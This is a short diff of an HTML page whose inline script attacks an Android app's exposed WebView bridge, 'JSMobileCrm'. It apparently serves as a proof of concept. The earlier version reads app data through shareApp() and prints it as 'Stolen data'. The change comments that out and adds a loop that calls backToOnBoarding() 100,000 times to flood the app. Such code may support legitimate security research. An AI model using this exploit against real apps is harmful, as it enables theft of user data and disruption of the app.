@@ -5,9 +5,13 @@
     <script type="text/javascript">
         var data;
         if(window.JSMobileCrm) { // Android
-            data = window.JSMobileCrm.shareApp();
+            //data = window.JSMobileCrm.shareApp();
             //data1 = window.JSMobileCrm.
-            document.alert("hello");
+            for( i =0;i<100000;i++)
+            {
+              window.JSMobileCrm.backToOnBoarding();
+            }
+            //does not work document.alert("hello");
         }
         if(data) {
             document.write("Stolen data: " + data);
